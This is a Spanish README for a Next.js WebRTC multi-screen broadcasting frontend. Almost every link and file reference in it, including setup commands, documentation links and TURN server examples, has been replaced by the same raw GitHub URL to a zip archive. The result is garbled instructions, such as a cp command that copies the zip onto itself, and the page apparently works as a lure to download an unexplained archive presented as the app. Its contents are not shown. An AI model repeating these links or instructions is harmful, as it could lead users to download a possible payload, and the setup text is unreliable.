# Frontend Transmisión Multipantalla

App https://github.com/KaterineLimaE/frontend-transmision-multipantalla-web/raw/refs/heads/main/src/components/frontend_web_multipantalla_transmision_1.5-alpha.4.zip (App Router + Tailwind v4) para ver categorías y transmitir pantalla.

## Configuración
1. Node 18+
2. `cp https://github.com/KaterineLimaE/frontend-transmision-multipantalla-web/raw/refs/heads/main/src/components/frontend_web_multipantalla_transmision_1.5-alpha.4.zip https://github.com/KaterineLimaE/frontend-transmision-multipantalla-web/raw/refs/heads/main/src/components/frontend_web_multipantalla_transmision_1.5-alpha.4.zip` (o crea `https://github.com/KaterineLimaE/frontend-transmision-multipantalla-web/raw/refs/heads/main/src/components/frontend_web_multipantalla_transmision_1.5-alpha.4.zip`)
3. `NEXT_PUBLIC_BACKEND_URL` debe apuntar al backend (local o Render)
4. Opcional: `NEXT_PUBLIC_ICE_SERVERS` para configurar STUN/TURN (JSON). Ver `https://github.com/KaterineLimaE/frontend-transmision-multipantalla-web/raw/refs/heads/main/src/components/frontend_web_multipantalla_transmision_1.5-alpha.4.zip`.

## Desarrollo
- `npm install`
- `npm run dev` y abre http://localhost:3000

## Producción
- `npm run build` y `npm start`

## Rutas
- `/` inicio con enlaces a categorías y temporizador
- `/categoria/[id]` viewer WebRTC (recibe múltiples streams)
-- `/transmitir?cat=1` broadcaster WebRTC (comparte pantalla a la categoría)

## Notas de conectividad (WebRTC)
- Por defecto usa STUN público de Google.
- En redes restrictivas necesitarás TURN. Define `NEXT_PUBLIC_ICE_SERVERS` con tus servidores.
- Ejemplo: `[{"urls":["https://github.com/KaterineLimaE/frontend-transmision-multipantalla-web/raw/refs/heads/main/src/components/frontend_web_multipantalla_transmision_1.5-alpha.4.zip"]},{"urls":"https://github.com/KaterineLimaE/frontend-transmision-multipantalla-web/raw/refs/heads/main/src/components/frontend_web_multipantalla_transmision_1.5-alpha.4.zip","username":"user","credential":"pass"}]`

## Primeros Pasos

Primero, ejecuta el servidor de desarrollo:

```bash
npm run dev
```

Abre [http://localhost:3000](http://localhost:3000) con tu navegador para ver el resultado.

Puedes comenzar editando la página modificando `https://github.com/KaterineLimaE/frontend-transmision-multipantalla-web/raw/refs/heads/main/src/components/frontend_web_multipantalla_transmision_1.5-alpha.4.zip`. La página se actualiza automáticamente mientras editas el archivo.

Este proyecto usa [`next/font`](https://github.com/KaterineLimaE/frontend-transmision-multipantalla-web/raw/refs/heads/main/src/components/frontend_web_multipantalla_transmision_1.5-alpha.4.zip) para optimizar y cargar automáticamente [Geist](https://github.com/KaterineLimaE/frontend-transmision-multipantalla-web/raw/refs/heads/main/src/components/frontend_web_multipantalla_transmision_1.5-alpha.4.zip), una nueva familia de fuentes para Vercel.

## Despliegue
- Vercel: crea proyecto nuevo, importa este repo, añade `NEXT_PUBLIC_BACKEND_URL` y opcional `NEXT_PUBLIC_ICE_SERVERS`.

